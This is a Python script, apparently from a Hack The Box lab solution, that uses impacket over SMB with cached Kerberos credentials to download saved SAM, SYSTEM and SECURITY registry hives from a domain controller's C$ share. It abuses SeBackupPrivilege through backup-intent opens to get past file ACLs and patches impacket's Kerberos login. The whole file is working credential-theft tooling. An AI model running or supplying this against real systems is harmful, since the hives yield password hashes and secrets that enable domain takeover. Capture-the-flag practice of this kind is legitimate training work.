#!/usr/bin/env python3
# download_hives.py
# Downloads SAM.save / SYSTEM.save / SECURITY.save from C$\Windows\Temp
# using FILE_OPEN_FOR_BACKUP_INTENT so SeBackupPrivilege (via Backup Operators
# membership) is honored, bypassing the normal file ACL that blocks a plain get.

import sys

# --- crealm patch (same fix validated earlier) ---
import impacket.smb3 as smb3
_orig_kerberosLogin = smb3.SMB3.kerberosLogin

def patched_kerberosLogin(self, *args, **kwargs):
    args = list(args)
    if len(args) >= 3:
        args[2] = 'DARKZERO.EXT'
    else:
        kwargs['domain'] = 'DARKZERO.EXT'
    return _orig_kerberosLogin(self, *args, **kwargs)

smb3.SMB3.kerberosLogin = patched_kerberosLogin
# --- end patch ---

from impacket.smbconnection import SMBConnection
from impacket.smb3structs import (
    FILE_READ_DATA, FILE_READ_EA, FILE_READ_ATTRIBUTES, FILE_SHARE_READ,
    FILE_NON_DIRECTORY_FILE, FILE_OPEN
)

FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000

TARGET_IP = "172.16.20.1"
TARGET_NAME = "dc01.darkzero.htb"
DOMAIN = "darkzero.htb"
USER = "celia"
SHARE = "C$"
REMOTE_DIR = "Windows\\Temp\\"
FILES = ["SAM.save", "SYSTEM.save", "SECURITY.save"]

def main():
    conn = SMBConnection(TARGET_NAME, TARGET_IP, sess_port=445)
    # mutualAuth=False is required against Server 2025 - see writeup section 5.3
    conn.kerberosLogin(USER, '', DOMAIN, useCache=True)

    treeId = conn.connectTree(SHARE)
    smbC = conn.getSMBServer()

    for fname in FILES:
        remote_path = REMOTE_DIR + fname
        print(f"[*] Opening {remote_path} with backup intent...")
        fileId = smbC.create(
            treeId,
            remote_path,
            desiredAccess=FILE_READ_DATA | FILE_READ_EA | FILE_READ_ATTRIBUTES,
            shareMode=FILE_SHARE_READ,
            creationOptions=FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT,
            creationDisposition=FILE_OPEN,
            fileAttributes=0,
        )
        print(f"[*] Reading {fname}...")
        data = b""
        offset = 0
        chunk_size = 65536
        while True:
            try:
                chunk = smbC.read(treeId, fileId, offset=offset, bytesToRead=chunk_size)
            except Exception as e:
                if 'STATUS_END_OF_FILE' in str(e):
                    break
                raise
            if not chunk:
                break
            data += chunk
            offset += len(chunk)
        smbC.close(treeId, fileId)
        with open(fname, "wb") as f:
            f.write(data)
        print(f"[+] Saved {fname} ({len(data)} bytes) locally")

    conn.close()

if __name__ == "__main__":
    main()
